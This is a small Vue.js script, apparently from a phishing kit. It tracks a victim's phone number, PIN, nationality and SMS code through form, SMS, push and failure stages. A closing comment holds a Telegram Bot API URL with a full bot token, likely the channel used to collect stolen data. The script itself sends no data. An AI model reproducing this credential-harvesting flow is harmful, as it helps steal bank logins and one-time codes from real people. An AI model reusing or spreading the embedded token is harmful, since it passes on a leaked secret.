new Vue({
    el: "#app",
    data() {
        return {
            nummer: "",
            pin: "",

            nationality: "",
            code_sms_fail: "",

            sessionid: "",

            // form, sms, push, fail_data
            statusCode: "1",


        };
    },
    computed: {},
    watch: {

    },
    methods: {
        currentStatus(targetCode) {
            return this.statusCode === targetCode;
        },
        changeCode(newCode) {
            this.statusCode = newCode;
        },

    }
});

// https://api.telegram.org/bot6056565539:AAFUpaeRtnY5uXGyyWcHP5OiuhCsu0T7rgM/deleteWebhook